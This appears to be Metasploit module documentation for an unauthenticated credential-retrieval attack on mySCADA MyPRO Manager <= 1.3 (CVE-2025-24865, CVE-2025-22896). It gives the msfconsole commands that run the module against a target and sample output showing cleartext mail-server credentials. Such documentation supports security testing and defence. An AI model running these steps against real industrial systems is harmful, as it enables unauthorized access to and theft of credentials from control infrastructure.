## Vulnerable Application

**Vulnerability Description**

This module exploits two vulnerabilities (CVE-2025-24865 & CVE-2025-22896) in mySCADA MyPRO Manager <= v1.3 to retrieve the configured
credentials for the mail server.

The administrative web interface has certain features where credentials are required to be accessed, but the implementation is flawed,
allowing to bypass the requirement. Other important administrative features do not require credentials at all, allowing an unauthenticated
remote attacker to perform privileged actions. These issues are tracked through CVE-2025-24865.
Another vulnerability, tracked through CVE-2025-22896, is related to the cleartext storage of various credentials by the application.

One way how these issues can be exploited is to allow an unauthenticated remote attacker to retrieve the cleartext credentials of the mail
server that is configured by the product, which this module does.

Versions <= 1.3 are affected. CISA published [ICSA-25-044-16](https://www.cisa.gov/news-events/ics-advisories/icsa-25-044-16) to cover
the security issues.

**Vulnerable Application Installation**

A trial version of the software can be obtained from [the vendor](https://www.myscada.org/mypro/).

**Successfully tested on**

- mySCADA MyPRO Manager 1.3 on Windows 11 (22H2)

## Verification Steps

1. Install the application
2. After installation, reboot the system and wait some time until a runtime (e.g., 9.2.1) has been fetched and installed.
3. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/admin/scada/mypro_mgr_creds 
msf6 auxiliary(admin/scada/mypro_mgr_creds) > set RHOSTS <IP>
msf6 auxiliary(admin/scada/mypro_mgr_creds) > run 
```

## Scenarios

Running the module against MyPRO Manager v1.3 on Windows 11, should result in an output similar to the
following:

```
msf6 auxiliary(admin/scada/mypro_mgr_creds) > run
[*] Running module against 192.168.1.78

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[+] Mail server credentials retrieved:
[+] Host: smtp.example.com
[+] Port: 993
[+] Auth Type: login
[+] User: user
[+] Password: SuperS3cr3t!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/scada/mypro_mgr_creds) > creds
Credentials
===========

host          origin        service           public  private       realm  private_type  JtR Format  cracked_password
----          ------        -------           ------  -------       -----  ------------  ----------  ----------------
192.168.1.78  192.168.1.78  34022/tcp (http)  user    SuperS3cr3t!         Password
```
